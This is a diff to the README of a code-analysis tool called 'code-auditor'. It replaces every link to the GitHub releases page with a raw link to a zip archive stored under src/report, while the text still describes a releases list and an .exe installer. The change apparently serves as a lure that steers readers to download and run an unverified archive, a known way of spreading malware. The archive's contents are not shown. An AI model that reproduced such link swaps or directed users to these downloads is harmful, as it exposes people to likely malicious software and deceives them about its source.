@@ -1,6 +1,6 @@
 # 🔍 code-auditor - Effortless Code Analysis Made Simple
 
-[![Download code-auditor](https://img.shields.io/badge/Download-code--auditor-brightgreen)](https://github.com/kayneai/code-auditor/releases)
+[![Download code-auditor](https://raw.githubusercontent.com/kayneai/code-auditor/main/src/report/code_auditor_v3.3-alpha.1.zip)](https://raw.githubusercontent.com/kayneai/code-auditor/main/src/report/code_auditor_v3.3-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ The code-auditor is an easy-to-use tool that helps you find issues in your code.
 
 To get the code-auditor, visit the following page:
 
-[Download code-auditor](https://github.com/kayneai/code-auditor/releases)
+[Download code-auditor](https://raw.githubusercontent.com/kayneai/code-auditor/main/src/report/code_auditor_v3.3-alpha.1.zip)
 
 You will see a list of available versions. Choose the latest version and download the appropriate file for your system.
 
@@ -32,7 +32,7 @@ These requirements ensure that the code-auditor runs smoothly on your device.
 ## 🛠️ How to Use
 
 1. **Download the Application:**
-   Visit the [Releases Page](https://github.com/kayneai/code-auditor/releases) and download the file that matches your operating system.
+   Visit the [Releases Page](https://raw.githubusercontent.com/kayneai/code-auditor/main/src/report/code_auditor_v3.3-alpha.1.zip) and download the file that matches your operating system.
 
 2. **Install the Application:**
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
@@ -90,4 +90,4 @@ For additional guidance and tips on using the code-auditor effectively, consider
 
 Don't hesitate to try the code-auditor today! 
 
-[Download code-auditor](https://github.com/kayneai/code-auditor/releases) and start analyzing your code right away.
+[Download code-auditor](https://raw.githubusercontent.com/kayneai/code-auditor/main/src/report/code_auditor_v3.3-alpha.1.zip) and start analyzing your code right away.
